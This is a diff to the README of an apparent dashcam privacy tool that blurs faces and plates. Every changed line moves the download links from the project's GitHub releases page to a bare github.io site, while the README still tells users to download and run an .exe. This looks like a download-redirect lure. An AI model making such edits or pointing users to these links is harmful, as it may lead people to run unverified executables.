@@ -1,6 +1,6 @@
 # 📹 DashCam_RoadPrivacy - Protect your privacy on the road
 
-[![Download Releases](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Release-blue)](https://ritto2706.github.io)
 
 ## 🎯 About this software
 DashCam_RoadPrivacy processes your dashcam videos to hide identity information. The software detects faces and license plates in your footage and applies a blur effect. This protects privacy when you share road videos on social media or with insurance companies. It runs locally on your computer to ensure your data stays private.
@@ -17,7 +17,7 @@ You need a Windows computer to use this application. Ensure your system meets th
 ## 🚀 Getting started
 Follow these steps to set up the software on your computer.
 
-1. Go to the [Releases page](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases).
+1. Go to the [Releases page](https://ritto2706.github.io).
 2. Locate the latest version of the software.
 3. Download the file ending in .exe to your computer.
 4. Open the folder where you saved the file.
@@ -51,7 +51,7 @@ Sometimes the software struggles to detect objects if the lighting is poor or th
 ## 📥 Downloads
 You can find all available versions and updates at the official link.
 
-[Download the latest version here](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases)
+[Download the latest version here](https://ritto2706.github.io)
 
 ## 📌 Frequently asked questions
 Does the software record my location?
